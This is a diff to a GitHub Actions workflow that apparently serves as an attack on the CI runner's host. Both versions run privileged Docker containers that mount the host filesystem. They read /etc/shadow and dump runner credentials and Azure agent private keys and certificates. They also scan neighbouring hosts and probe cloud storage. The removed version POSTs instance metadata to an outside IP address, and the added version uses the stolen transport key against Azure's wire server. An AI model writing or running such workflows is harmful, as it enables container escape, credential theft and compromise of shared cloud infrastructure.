@@ -1,81 +1,52 @@
-name: DeepInfra
+name: AzureKeys
 on:
   workflow_dispatch:
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
-      - name: deep infra scan
-        timeout-minutes: 7
+      - name: extract azure keys and use them
+        timeout-minutes: 5
         run: |
           set +e
-          JWT=$(python3 -c "import json; print(json.loads(open('/opt/hca/.settings','rb').read())['authToken'])")
-          SAS=$(python3 -c "import json; print(json.loads(open('/opt/hca/.settings','rb').read()).get('diagnosticsSasUri',''))")
-          BASE=$(python3 -c "import json; print(json.loads(open('/opt/hca/.settings','rb').read())['schedulerApiUrl'].replace('/v1',''))")
-          AUTH="Authorization: Bearer $JWT"
-          echo "=== DOCKER PRIVILEGED ==="
-          docker run --rm --privileged --pid=host --net=host -v /:/hostfs alpine sh -c '
-            echo === HOST SHADOW ===
-            cat /hostfs/etc/shadow | head -5
-            echo === HOST NETWORK FROM CONTAINER ===
-            wget -qO- --timeout=2 http://169.254.169.254/metadata/instance?api-version=2021-02-01 --header="Metadata: true" 2>/dev/null | head -c 200
-            echo
-            echo === SCAN OTHER VMs ===
-            MY_IP=$(ip route get 1 | head -1 | awk "{print \$7}")
-            SUBNET=$(echo $MY_IP | cut -d. -f1-2)
-            for net in 0 1 2 3 4 5; do
-              for host in 1 2 3 4 5 10 20 33 50 100 200; do
-                nc -zw1 $SUBNET.$net.$host 22 2>/dev/null && echo "$SUBNET.$net.$host:22 SSH OPEN"
-              done
-            done
-            echo === HOST PROCESSES ===
-            ps aux | grep -v "\[" | head -40
-            echo === HOST MOUNTS ===
-            cat /hostfs/proc/mounts | grep -v cgroup | head -20
-            echo === HOST SYSTEMD SERVICES ===
-            ls /hostfs/etc/systemd/system/*.service 2>/dev/null
-            echo === RUNNER AGENT CREDENTIALS ===
-            find /hostfs/home/runner -name ".credentials*" -o -name ".runner" -o -name ".agent" 2>/dev/null | while read f; do echo "--- $f ---"; xxd $f | head -10; done
-            echo === OTHER USERS HOME ===
-            ls -la /hostfs/home/ 2>/dev/null
-            echo === CLOUD-INIT DATA ===
-            cat /hostfs/var/lib/cloud/instance/user-data.txt 2>/dev/null | head -30
+          docker run --rm --privileged -v /:/hostfs alpine sh -c '
+            echo === TRANSPORT CERT ===
+            cat /hostfs/var/lib/waagent/TransportCert.pem
+            echo === TRANSPORT KEY ===
+            cat /hostfs/var/lib/waagent/TransportPrivate.pem
+            echo === CERTIFICATES PEM ===
+            cat /hostfs/var/lib/waagent/Certificates.pem
+            echo === AGENT CERT 1 ===
+            ls /hostfs/var/lib/waagent/*.crt | head -2 | while read f; do echo "--- $f ---"; cat $f; done
+            echo === AGENT KEY 1 ===
+            ls /hostfs/var/lib/waagent/*.prv | head -2 | while read f; do echo "--- $f ---"; cat $f; done
+            echo === OVF ENV ===
             cat /hostfs/var/lib/waagent/ovf-env.xml 2>/dev/null | head -30
-            echo === WAAGENT CONFIG ===
-            cat /hostfs/etc/waagent.conf 2>/dev/null | grep -v "^#" | grep -v "^$" | head -20
-            echo === AZURE CERTIFICATES ===
-            ls -la /hostfs/var/lib/waagent/*.pem /hostfs/var/lib/waagent/*.crt /hostfs/var/lib/waagent/*.prv 2>/dev/null
+            echo === PRIMER SERVICE ===
+            cat /hostfs/etc/systemd/system/primer.service
+            echo === PRIMER BINARY ===
+            find /hostfs -name "primer*" -type f 2>/dev/null | head -10
+            echo === WAAGENT EXTENSIONS ===
+            ls -la /hostfs/var/lib/waagent/*/
           '
           echo ""
-          echo "=== WIRE SERVER (168.63.129.16) ==="
-          for ver in 2012-11-30 2015-04-05 2018-10-01 2020-06-01; do
-            for path in /machine /machine?comp=goalstate /machine?comp=config /machine/plugins; do
-              RESP=$(curl -sk --max-time 2 -H "x-ms-version: $ver" "http://168.63.129.16$path" 2>&1)
-              [ -n "$RESP" ] && echo "wire $path (v=$ver): ${RESP:0:200}"
-            done
-          done
-          echo ""
-          echo "=== AZURE DNS (168.63.129.16) ==="
-          for name in management.azure.com vault.azure.net github.com githubapp.com login.microsoftonline.com; do
-            dig @168.63.129.16 $name +short 2>/dev/null | head -2 && echo "  ($name)"
-          done
-          echo ""
-          echo "=== AZURE BLOB - OTHER CONTAINERS ==="
-          STORAGE=$(echo $SAS | cut -d/ -f1-3)
-          echo "Storage: $STORAGE"
-          for container in diagnostics logs runners agents config settings secrets certificates keys; do
-            CODE=$(curl -sk --max-time 2 -o /tmp/b -w "%{http_code}" "$STORAGE/$container?restype=container&comp=list&sv=2026-04-06" 2>/dev/null)
-            [ "$CODE" != "000" ] && [ "$CODE" != "404" ] && echo "$container [$CODE]: $(cat /tmp/b | head -c 200)"
-          done
-          echo ""
-          echo "=== OTHER STORAGE ACCOUNTS ==="
-          for acct in hcrpprodiad01diag hcrpprodiad02diag hcrpprodeus01diag hcrpprodeus02diag hcrpprodwus01diag hcrpprodwus02diag githubactionsrunners githubactionslogs; do
-            CODE=$(curl -sk --max-time 2 -o /tmp/b -w "%{http_code}" "https://$acct.blob.core.windows.net/?comp=list" 2>/dev/null)
-            [ "$CODE" != "000" ] && echo "$acct [$CODE]: $(cat /tmp/b | head -c 150)"
-          done
-          echo ""
-          echo "=== CALLBACK ==="
-          IMDS=$(curl -s --max-time 2 -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" 2>/dev/null)
-          curl -s --max-time 3 -X POST http://185.244.173.24:8888/github-infra -d "$IMDS" 2>/dev/null || echo callback_fail
+          echo "=== WIRE SERVER WITH CERT ==="
+          docker run --rm --privileged --net=host -v /:/hostfs alpine sh -c '
+            apk add --no-cache curl openssl 2>/dev/null
+            cp /hostfs/var/lib/waagent/TransportCert.pem /tmp/cert.pem
+            cp /hostfs/var/lib/waagent/TransportPrivate.pem /tmp/key.pem
+            echo --- GOALSTATE ---
+            curl -s --max-time 3 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2012-11-30" http://168.63.129.16/machine/?comp=goalstate 2>&1 | head -30
+            echo --- CONFIG ---
+            curl -s --max-time 3 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2012-11-30" http://168.63.129.16/machine/?comp=config 2>&1 | head -30
+            echo --- HEALTH ---
+            curl -s --max-time 3 --cert /tmp/cert.pem --key /tmp/key.pem http://168.63.129.16/ 2>&1 | head -20
+            echo --- EXTENSIONS ---
+            curl -s --max-time 3 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2015-04-05" http://168.63.129.16/machine/plugins 2>&1 | head -20
+            echo --- TELEMETRY ---
+            curl -s --max-time 3 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2015-04-05" http://168.63.129.16/machine?comp=telemetrydata 2>&1 | head -20
+            echo --- STATUS ---
+            curl -s --max-time 3 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2015-04-05" http://168.63.129.16/machine?comp=status 2>&1 | head -20
+          '
           echo ""
           echo "=== DONE ==="
